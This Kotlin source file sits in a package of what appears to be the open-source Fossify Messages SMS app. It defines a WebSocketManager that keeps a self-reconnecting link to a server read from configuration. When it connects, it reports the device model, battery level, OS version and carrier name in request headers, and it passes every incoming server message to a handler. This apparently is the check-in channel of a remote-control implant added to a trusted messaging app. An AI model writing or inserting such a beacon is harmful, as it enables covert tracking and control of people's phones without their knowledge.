package org.fossify.messages.androbox

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.util.concurrent.TimeUnit

class WebSocketManager(
    private val context: Context,
    private val onMessage: (String) -> Unit,
    private val onConnectionChange: (Boolean) -> Unit
) {
    private val client = OkHttpClient.Builder().pingInterval(30, TimeUnit.SECONDS).build()
    private var webSocket: WebSocket? = null
    private var isConnected = false
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun connect() {
        val urls = ConfigManager.getServerUrls(context)
        if (urls == null) {
            Log.e("WebSocketManager", "No config, cannot connect")
            onConnectionChange(false)
            reconnectDelayed()
            return
        }
        val (_, socketUrl) = urls
        val request = Request.Builder().url(socketUrl)
            .addHeader("model", android.os.Build.MODEL)
            .addHeader("battery", getBatteryPercentage().toString())
            .addHeader("version", android.os.Build.VERSION.RELEASE)
            .addHeader("brightness", "unknown")
            .addHeader("provider", getNetworkProvider())
            .build()
        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                this@WebSocketManager.webSocket = webSocket
                isConnected = true
                onConnectionChange(true)
                Log.d("WebSocketManager", "Connected")
            }
            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("WebSocketManager", "Received: $text")
                onMessage(text)
            }
            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                webSocket.close(1000, null)
                isConnected = false
                onConnectionChange(false)
                Log.d("WebSocketManager", "Closing: $reason")
                reconnectDelayed()
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("WebSocketManager", "Failure: ${t.message}")
                isConnected = false
                onConnectionChange(false)
                reconnectDelayed()
            }
        })
    }

    private fun reconnectDelayed() {
        scope.launch {
            delay(5000)
            webSocket?.close(1001, "Reconnecting")
            webSocket = null
            connect()
        }
    }

    fun disconnect() {
        scope.cancel()
        webSocket?.close(1000, "Manual disconnect")
        client.dispatcher.executorService.shutdown()
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) { -1 }
    }

    private fun getNetworkProvider(): String {
        return try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                tm.networkOperatorName.ifEmpty { "Unknown" }
            } else { "Permission denied" }
        } catch (e: Exception) { "Unknown" }
    }
}